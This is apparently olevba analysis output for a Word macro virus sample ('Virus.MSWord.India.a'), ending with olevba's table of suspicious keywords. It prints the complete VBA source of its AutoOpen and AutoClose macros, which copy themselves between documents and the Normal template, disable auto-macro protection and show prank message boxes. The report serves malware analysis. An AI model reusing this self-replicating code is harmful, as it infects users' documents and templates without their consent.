olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.India.a-19e66bab21233412a5e5247c8ce1e519a7a01a5e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.India.a-19e66bab21233412a5e5247c8ce1e519a7a01a5e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.India.a-19e66bab21233412a5e5247c8ce1e519a7a01a5e - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim sMe$
Dim sMacro$
WordBasic.MsgBox "Ravi Good Bye", "I Love India"
WordBasic.MsgBox WordBasic.[MacroFileName$]()
WordBasic.DisableAutoMacros 0
On Error GoTo -1: On Error GoTo Abort

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg

If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
'dlg.Password = "India"
'dlg.WritePassword = "India"
'FileSaveAs dlg
'--------------------------------------------------------

sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sMacro$
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", sMacro$
WordBasic.FileSaveAs dlg

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.India.a-19e66bab21233412a5e5247c8ce1e519a7a01a5e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim sMe$
Dim sMacro$

sMe$ = WordBasic.[FileName$]()

WordBasic.MsgBox "Ravi, Have a nice day", "I Love India"
WordBasic.MsgBox WordBasic.[MacroFileName$]()
sMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy sMacro$, "Global:AutoClose"

sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy sMacro$, "Global:AutoOpen"

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

